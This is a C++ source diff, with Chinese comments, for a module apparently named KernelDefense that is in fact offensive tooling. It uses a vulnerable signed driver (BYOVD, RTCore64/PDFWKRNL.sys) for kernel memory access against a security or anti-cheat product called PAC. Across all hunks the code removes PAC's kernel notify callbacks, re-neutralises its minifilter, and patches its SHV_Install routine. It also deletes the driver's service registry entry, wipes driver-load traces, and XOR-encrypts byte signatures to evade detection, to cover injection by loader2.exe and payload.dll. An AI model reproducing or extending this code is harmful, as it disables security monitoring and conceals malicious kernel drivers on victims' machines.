@@ -6543,22 +6543,41 @@ void KernelDefense::GuardPac() {
     //   在主循环中独立处理 (每 4-6s), 不依赖 GuardPac.
     //   (memory 约束: "All SCM operations must be replaced with direct registry
     //    deletion to avoid ntdll crashes in manual-mapped DLL context")
-    return;
-#if 0
-    // ★ v3.126n: 三重检查 — 服务 + minifilter 存在性 + 回调完整性
-    bool needReDisable = false;
+    //
+    // ★ BUILD 553: 恢复 minifilter 周期性重新中和 (修复 BUILD 552 A1 缺陷)
+    //   问题: BUILD 552 中 MinifilterNeutralizer::NeutralizeMessageTransfer() 只在
+    //         EnableAll() 中调用一次, 主循环无周期性重新中和. 如果 PAC 恢复
+    //         FLT_FILTER.Operations 数组, minifilter 监控复活但 loader2 无响应.
+    //   修复: 在 GuardPac 中恢复 minifilter 检查 (不恢复 SCM 检查, SCM 仍崩溃)
+    //   频率: 60-90s (通过 ReapplyAllCallbacks 末尾调用)
+    //   日志: ByovdDiag 已条件编译消除 (NDEBUG), 不增加明文特征
+    auto& kma = KernelMemoryAccessor::Instance();
+    if (!kma.IsActive()) return;
 
-    // ★ BUILD 474: 先检查 MessageTransfer 是否加载 — 否则 SCM 崩溃
-    // ★ BUILD 550: 解密内核模块名 (原 "MessageTransfer.sys" 明文)
-    {
-        char mtName[32];
-        STEALTH_STR_DECRYPT_TO("MessageTransfer.sys", mtName, sizeof(mtName));
-        uint64_t mtBase = KernelMemoryAccessor::Instance().GetKernelModuleBase(mtName);
-        SecureZeroMemory(mtName, sizeof(mtName));
-        if (!mtBase) {
-            return;  // 驱动未加载, 无需检查 SCM
-        }
+    // 检查 MessageTransfer.sys 是否加载 (解密模块名, 避免明文)
+    char mtName[32];
+    STEALTH_STR_DECRYPT_TO("MessageTransfer.sys", mtName, sizeof(mtName));
+    uint64_t mtBase = kma.GetKernelModuleBase(mtName);
+    SecureZeroMemory(mtName, sizeof(mtName));
+    if (!mtBase) return;  // 驱动未加载, 无需检查
+
+    // ★ BUILD 553: 直接检查 Operations 数组是否仍是 stub
+    //   不使用 IsPacMinifilterLoaded (该函数在 #if 0 中废弃, 依赖 fltlib.dll 不安全)
+    //   IsMessageTransferNeutralized 通过 BYOVD 内核 R/W 读取 fltmgr FilterList
+    //   + Operations 数组验证, 不依赖 fltlib.dll, 安全可用
+    //   如果返回 false (Operations 被 PAC 恢复或 minifilter 不在列表), 重新中和
+    //   安全性论证:
+    //     - minifilter 不在 FilterList → 返回 false → 重新中和 (NeutralizeMessageTransfer 内部处理找不到的情况)
+    //     - minifilter 在 FilterList 但 Operations 已被 PAC 恢复 (非 stub) → 返回 false → 重新中和 (正确行为)
+    //     - minifilter 在 FilterList 且 Operations 仍是 stub → 返回 true → 跳过重新中和 (正确行为)
+    if (!MinifilterNeutralizer::IsMessageTransferNeutralized()) {
+        ByovdDiag("B553:GP: minifilter restored, re-neutralizing\n");
+        MinifilterNeutralizer::NeutralizeMessageTransfer();
     }
+#if 0
+    // ★ BUILD 530 死代码归档: SCM 检查路径 (manual-mapped DLL 上下文中崩溃, 永久废弃)
+    //   保留作为历史参考, 不再启用. 如需恢复 SCM 检查, 必须先解决 ntdll 崩溃问题.
+    bool needReDisable = false;
 
     // 检查 1: SCM 服务状态
     SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
@@ -6575,18 +6594,6 @@ void KernelDefense::GuardPac() {
             CloseServiceHandle(svc);
         }
         CloseServiceHandle(scm);
-    }
-
-    // 检查 2: minifilter 存在 + 回调是否被恢复
-    //   ★ v3.126n: 如果 minifilter 存在但回调是 stub → 无害 (Neutralize 成功)
-    //              如果 minifilter 存在但回调已恢复 → PAC 修复了 → 重新禁用
-    //              如果 minifilter 不在列表中 → 被卸载了 → 可能需要重新处理
-    if (!needReDisable) {
-        bool filterExists = IsPacMinifilterLoaded();
-        if (filterExists && !MinifilterNeutralizer::IsMessageTransferNeutralized()) {
-            ByovdDiag("B550:PC:GP: callback stubs overwritten! re-neutralizing...\n");
-            needReDisable = true;
-        }
     }
 
     if (needReDisable) {
@@ -6648,12 +6655,18 @@ KernelDefense::Result KernelDefense::EnableAll() {
     int pacOb = cbDisabler.DisableObCallbacks(pacNameA);
     int pacProc = cbDisabler.DisableProcessNotifyCallbacks(pacNameA);
     int pacImg = cbDisabler.DisableImageNotifyCallbacks(pacNameA);
-    if (pacOb || pacProc || pacImg) {
-        ByovdDiag("BYOVD: callbacks removed (tgt/%s) — ob=%d proc=%d img=%d\n",
-            pacNameA, pacOb, pacProc, pacImg);
+    // ★ BUILD 554 P0-2: 启动期立即摘除线程通知回调 (修复 A2 缺陷)
+    //   原 EnableAll 漏掉 DisableThreadNotifyCallbacks, 仅 DisableAll (ReapplyAllCallbacks)
+    //   包含此项 — 导致启动期 60-90s 窗口内 PAC PsSetCreateThreadNotifyRoutine 仍激活,
+    //   loader2.exe 注入 / payload.dll 内 CreateThread 调用会被 PAC 捕获.
+    int pacThread = cbDisabler.DisableThreadNotifyCallbacks(pacNameA);
+    if (pacOb || pacProc || pacImg || pacThread) {
+        ByovdDiag("BYOVD: callbacks removed (tgt/%s) — ob=%d proc=%d img=%d thread=%d\n",
+            pacNameA, pacOb, pacProc, pacImg, pacThread);
         result.obCallbacksRemoved += pacOb;
         result.processCallbacksRemoved += pacProc;
         result.imageCallbacksRemoved += pacImg;
+        result.threadCallbacksRemoved += pacThread;
     }
 
     // ★ BUILD 528: tgt minifilter 中和已废弃 — Win11 上 FLT_FILTER 布局无法定位,
@@ -6669,6 +6682,27 @@ KernelDefense::Result KernelDefense::EnableAll() {
     // ★ v3.126m: 清理内核驱动痕迹 (MmUnloadedDrivers / PiDDBCacheTable / CiHashBucket)
     //   在所有防御启用后, 最后由 BYOVD 内核 R/W 清理 RTCore64 加载/卸载痕迹
     KernelTraceCleaner::CleanAllTraces();
+
+    // ★ BUILD 554 P1-2: 删除 PDFWKRNL.sys SCM 服务条目 (修复 B2 缺陷)
+    //   原因: PDFWKRNL.sys 通过 SCM 加载后, 服务条目存在于
+    //         HKLM\SYSTEM\CurrentControlSet\Services\<svcName>, PAC 用户态组件
+    //         可通过 OpenSCManagerW + EnumServicesStatusEx 枚举所有服务发现 BYOVD 驱动.
+    //   策略: 驱动已加载到内核运行, 删除 SCM 注册表项不影响驱动功能
+    //         (驱动代码已在内核地址空间, 不依赖 SCM 维持运行).
+    //   实现: RegDeleteTreeW (advapi32 API, 在 manual-mapped DLL 中安全可用,
+    //         与 DisableAll L6716 同一 API, 已在 Build 474 验证可行).
+    if (result.driverLoaded) {
+        const wchar_t* svcName = kma.GetServiceName();
+        if (svcName && svcName[0]) {
+            // ★ BUILD 501: 手动构造路径替代 std::wstring 拼接
+            wchar_t keyPath[512] = {};
+            wcscpy_s(keyPath, L"SYSTEM\\CurrentControlSet\\Services\\");
+            wcscat_s(keyPath, svcName);
+            LONG delRes = RegDeleteTreeW(HKEY_LOCAL_MACHINE, keyPath);
+            ByovdDiag("BYOVD: SCM service entry '%ls' deleted (res=%d)\n",
+                svcName, (int)delRes);
+        }
+    }
 
     return result;
 }
@@ -6910,6 +6944,17 @@ uint8_t ShvInstallPatcher::m_originalBytes[6] = {};
 bool ShvInstallPatcher::m_hasOriginalBytes = false;
 uint64_t ShvInstallPatcher::m_patchedAddress = 0;
 
+// ★ BUILD 553: SIG1 特征码 XOR 加密 (修复 A3 缺陷)
+//   原因: BUILD 552 中 SIG1 = { 0x48, 0xB9, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00 }
+//         是明文 const 数组, 进入 .rdata 后 PAC 可反向利用 (扫描此特征 = 发现 patcher)
+//   策略: 编译期 XOR 加密, 运行时用 g_sig1Key (volatile 防常量传播) 解密到栈上
+//   密钥 0xA7, 加密后字节: 0xEF 0x1E 0xA7 0xA7 0xA7 0x27 0xA7 0xA7 0xA7 0xA7
+//   参考: payload.cpp L535 g_patKey 模式
+static volatile uint8_t g_sig1Key = 0xA7;
+static const uint8_t SIG1_ENC[10] = {
+    0xEF, 0x1E, 0xA7, 0xA7, 0xA7, 0x27, 0xA7, 0xA7, 0xA7, 0xA7
+};
+
 uint64_t ShvInstallPatcher::FindShvInstallEntry(uint64_t pacDriverBase, uint32_t textSize) {
     // 通过特征码扫描定位 SHV_Install 入口
     // 特征 (PAC_SHV_逆向分析报告 §3.2 L101-105):
@@ -6934,7 +6979,11 @@ uint64_t ShvInstallPatcher::FindShvInstallEntry(uint64_t pacDriverBase, uint32_t
     //   imm64 = 0x0000008000000000? 不对, MOV RCX, imm64 是 48 B9 + 8 字节 imm64
     //   0x80000000 = 2GB, imm64 = 0x0000000080000000 (8 字节小端)
     //   字节序列: 48 B9 00 00 00 80 00 00 00 00 (10 字节)
-    static const uint8_t SIG1[10] = { 0x48, 0xB9, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00 };
+    // ★ BUILD 553: 运行时从 SIG1_ENC 解密 (消除 .rdata 明文特征码)
+    uint8_t SIG1[10];
+    for (int j = 0; j < 10; j++) {
+        SIG1[j] = SIG1_ENC[j] ^ g_sig1Key;
+    }
 
     uint8_t buf[CHUNK_SIZE + OVERLAP];
     uint32_t scanned = 0;
@@ -6985,16 +7034,57 @@ uint64_t ShvInstallPatcher::FindShvInstallEntry(uint64_t pacDriverBase, uint32_t
             uint64_t backscanStart = sigVA - backscanSize;
 
             if (backscanSize > 0 && kma.ReadKernelVA(backscanStart, backscan, backscanSize)) {
-                // 从后向前查找 0xCC (int3 函数分隔符)
-                // 找到的 0xCC 位置 +1 即为 SHV_Install 入口
+                // ★ BUILD 553: 扩展边界查找 (修复 BUILD 552 B2 缺陷)
+                //   原实现仅查找 0xCC (int3), 但现代编译器 (MSVC/Clang) 函数对齐填充
+                //   常用 0x90 (nop) 或 0x00 (零填充), 导致边界查找失败 → patch 失败.
+                //   新策略: 三级边界查找, 优先级 0xCC > 0x90 连续 ≥2 > 0x00 连续 ≥4
+                //   验证: 找到边界后, 下一字节必须是合法函数序言
+                //         (0x48=REX.W mov/sub, 0x55=push rbp, 0x40-0x4F=REX prefix)
+
+                // Pass 1: 查找 0xCC (int3, 最可靠 — 不会出现在指令中间)
                 for (int32_t k = backscanSize - 1; k >= 0; k--) {
                     if (backscan[k] == 0xCC) {
-                        // 验证后续字节是否为合法函数序言 (sub rsp / push rbp / mov rax 等)
                         uint32_t entryOffset = k + 1;
+                        if (entryOffset >= backscanSize) continue;
                         uint8_t firstByte = backscan[entryOffset];
-                        // 常见序言: 48 89 (mov), 48 83 (sub rsp), 55 (push rbp), 40-4F (REX prefix)
-                        if (firstByte == 0x48 || firstByte == 0x55 || firstByte == 0x40 ||
-                            firstByte == 0x41 || firstByte == 0x42 || firstByte == 0x43 ||
+                        if (firstByte == 0x48 || firstByte == 0x55 ||
+                            (firstByte >= 0x40 && firstByte <= 0x4F)) {
+                            return backscanStart + entryOffset;
+                        }
+                    }
+                }
+
+                // Pass 2: 查找连续 ≥2 字节 0x90 (nop 填充, MSVC 常用)
+                //   单字节 0x90 可能是 xchg eax,eax 指令, 需要 ≥2 字节才视为填充
+                for (int32_t k = backscanSize - 2; k >= 0; k--) {
+                    if (backscan[k] == 0x90 && backscan[k + 1] == 0x90) {
+                        // 找到连续 nop, 从此处向后扫描直到第一个非 0x90 字节
+                        uint32_t entryOffset = k + 2;
+                        while (entryOffset < backscanSize && backscan[entryOffset] == 0x90) {
+                            entryOffset++;
+                        }
+                        if (entryOffset >= backscanSize) continue;
+                        uint8_t firstByte = backscan[entryOffset];
+                        if (firstByte == 0x48 || firstByte == 0x55 ||
+                            (firstByte >= 0x40 && firstByte <= 0x4F)) {
+                            return backscanStart + entryOffset;
+                        }
+                    }
+                }
+
+                // Pass 3: 查找连续 ≥4 字节 0x00 (零填充, Clang/部分 MSVC 使用)
+                //   0x00 在指令中间很常见 (如 add eax, 0), 必须 ≥4 字节才视为填充
+                for (int32_t k = backscanSize - 4; k >= 0; k--) {
+                    if (backscan[k] == 0x00 && backscan[k + 1] == 0x00 &&
+                        backscan[k + 2] == 0x00 && backscan[k + 3] == 0x00) {
+                        // 找到连续 0x00, 从此处向后扫描直到第一个非 0x00 字节
+                        uint32_t entryOffset = k + 4;
+                        while (entryOffset < backscanSize && backscan[entryOffset] == 0x00) {
+                            entryOffset++;
+                        }
+                        if (entryOffset >= backscanSize) continue;
+                        uint8_t firstByte = backscan[entryOffset];
+                        if (firstByte == 0x48 || firstByte == 0x55 ||
                             (firstByte >= 0x40 && firstByte <= 0x4F)) {
                             return backscanStart + entryOffset;
                         }
@@ -7002,13 +7092,11 @@ uint64_t ShvInstallPatcher::FindShvInstallEntry(uint64_t pacDriverBase, uint32_t
                 }
             }
 
-            // 未找到 0xCC 边界, 假设 SHV_Install 入口就是 sigVA (无序言直接 MOV RCX)
-            //   这是一个保守回退, 实际 SHV_Install 有序言, 但作为 fallback
-            //   ★ 注意: 这种情况下 patch 会覆盖 MOV RCX 指令而非函数入口, 仍然有效
-            //     (PAC 调用 SHV_Install 时仍会执行到 patch 后的 mov eax, -4; ret)
-            //   不过为安全起见, 我们返回 sigVA - 16 (假设序言为 16 字节) 作为候选
-            //   但这可能导致误 patch, 因此实际生产环境应严格依赖 0xCC 边界查找
-            //   此处保守返回 0 (未找到), 避免误 patch
+            // ★ BUILD 553: 所有边界查找策略均失败, 保守返回 0 (避免误 patch)
+            //   原实现注释提到"返回 sigVA - 16 作为候选", 但这可能导致误 patch
+            //   其他函数, 风险不可接受. 保守返回 0 让 PatchShvInstallEntry 处理失败.
+            //   失败后果: SHV 仍可激活, 但 BUILD 552 已确认 SHV 是临时模式,
+            //   即使首次 SHV_Install 成功, 后续周期性 SHV_Install 也会因 patch 而失败.
             ByovdDiag("BYOVD:ShvPatch: SIG1 found @ 0x%llX but no function boundary detected\n",
                 (unsigned long long)sigVA);
             return 0;
